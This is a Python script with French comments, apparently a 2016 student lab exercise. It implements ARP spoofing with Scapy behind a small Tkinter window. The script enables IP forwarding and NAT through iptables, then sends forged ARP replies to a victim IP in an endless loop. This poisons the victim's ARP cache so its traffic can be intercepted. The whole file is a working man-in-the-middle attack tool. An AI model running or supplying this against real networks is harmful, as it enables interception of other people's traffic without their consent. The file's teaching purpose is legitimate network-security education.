## TP : faire de l arp spoofing avec Scapy
#@Sandrine Cirjan et Vianney Thiebaut
#@date : 09/02/2016
##

#importer les modules necessaires
from scapy.all import * #scapy
from Tkinter import * #gui
import time #time
import os #commandes shell

#ajoute route statique
os.system("iptables -A FORWARD --in-interface eth0 -j ACCEPT")
os.system("iptables -t nat --append POSTROUTING --out-interface eth0 -j MASQUERADE")

#creation d'une fonction reutilisable dans les boutons
def arp_poisonning():
	op=1 #envoie un packet a la fois
	
	arp=ARP(op=op,psrc=spoof.get(),pdst=victim.get(),hwdst=mac.get()) #recupere les infos des formulaire et lance larp poisonning 
	
	while 1: #boucle
		send(arp) #envoyer larp poisonning
		time.sleep(2) #attendre 2 secondes entre chaque envoi

#affichage de la fenetre gui	
master = Tk()
master.title('ARP Poisonning') # donner un nom a la fenetre

#texte devant formulaire
Label(master, text="Entrez l'adresse IP de la victime: ").grid(row=0)
Label(master, text="Entrez l'adresse IP a usurper: ").grid(row=1)
Label(master, text="Entrez l adresse MAC a associer: ").grid(row=2)

#formulaire
victim = Entry(master)
spoof = Entry(master)
mac = Entry(master)

#emplacement des formulaires sur la grille
victim.grid(row=0, column=1)
spoof.grid(row=1, column=1)
mac.grid(row=2, column=1)

#creation des boutons
Button(master, text='Executer', command=arp_poisonning).grid(row=3, column=0, sticky=W, pady=4)
Button(master, text='Quitter', command=master.destroy).grid(row=3, column=1, sticky=W, pady=4)

#fin de la fenetre
master.mainloop()
